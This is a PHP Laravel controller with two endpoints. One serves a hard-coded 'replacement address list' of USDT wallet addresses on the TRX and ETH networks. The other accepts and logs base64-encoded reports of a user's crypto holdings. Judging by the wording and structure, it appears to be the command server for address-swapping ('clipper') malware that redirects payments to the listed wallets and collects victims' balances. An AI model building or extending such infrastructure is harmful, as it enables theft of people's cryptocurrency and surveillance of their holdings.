<?php

namespace App\Http\Controllers\Client;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;

class AssetsController extends Controller
{
    /**
     * 获取替换地址列表
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse|object
     */
    public function addressReplist(Request $request)
    {
        // 记录访问日志
        if (config('access_log.device_controller_enabled', true)) {
            Log::info('AssetsController访问日志', [
                'method' => 'addressReplist',
                'ip' => $request->ip(),
                'path' => $request->path(),
                'url' => $request->fullUrl(),
                'user_agent' => $request->userAgent(),
                'params' => $request->all(),
            ]);
        }


        info($request->all());
        
        // TODO: 从数据库或配置中获取替换地址列表
        // 示例数据
        $alist = [
            [
                'coin' => 'USDT',
                'mainnet' => 'TRX',
                'address' => 'TJFdmxqJbBJUxUHQdjcgPFBnYvqPmvH4Pj'
            ],
            [
                'coin' => 'USDT',
                'mainnet' => 'ETH',
                'address' => '0xfce69673bb5b1325f1258b3fa98a1413197f233e'
            ]
        ];

        return $this->success($alist);
    }

    /**
     * 上报资产数据
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse|object
     */
    public function reportAssets(Request $request)
    {
        // 获取原始请求体内容（base64编码的字符串）
        $encodedData = $request->getContent();

        // 记录访问日志
        if (config('access_log.device_controller_enabled', true)) {
            Log::info('AssetsController访问日志', [
                'method' => 'reportAssets',
                'ip' => $request->ip(),
                'path' => $request->path(),
                'url' => $request->fullUrl(),
                'user_agent' => $request->userAgent(),
                'content_length' => strlen($encodedData),
                'content' => $encodedData,
            ]);
        }

        if (empty($encodedData)) {
            return $this->fail(400, '请求体不能为空');
        }

        // 解码 base64 数据
        $decoded = base64_decode($encodedData, true);
        if ($decoded === false) {
            return $this->fail(400, 'base64解码失败');
        }

        // 解析 JSON 数据
        $jsonData = json_decode($decoded, true);
        if (json_last_error() !== JSON_ERROR_NONE) {
            return $this->fail(400, 'JSON解析失败: ' . json_last_error_msg());
        }

        info($jsonData);

/*
        // 验证必填字段
        if (empty($jsonData['userId'])) {
            return $this->fail(400, 'userId字段必填');
        }

        if (!isset($jsonData['total'])) {
            return $this->fail(400, 'total字段必填');
        }

        if (empty($jsonData['totalName'])) {
            return $this->fail(400, 'totalName字段必填');
        }

        if (empty($jsonData['coins']) || !is_array($jsonData['coins'])) {
            return $this->fail(400, 'coins字段必填且必须为数组');
        }

        // 验证 coins 数组中的每个元素
        foreach ($jsonData['coins'] as $index => $coin) {
            if (empty($coin['name'])) {
                return $this->fail(400, "coins[{$index}].name字段必填");
            }
            if (!isset($coin['amount'])) {
                return $this->fail(400, "coins[{$index}].amount字段必填");
            }
        }
*/

        // TODO: 实现资产数据保存逻辑
        // 示例：保存到数据库
        // Asset::create([
        //     'user_id' => $jsonData['userId'],
        //     'total' => $jsonData['total'],
        //     'total_name' => $jsonData['totalName'],
        //     'coins' => json_encode($jsonData['coins']),
        // ]);

        return $this->success();
    }
}
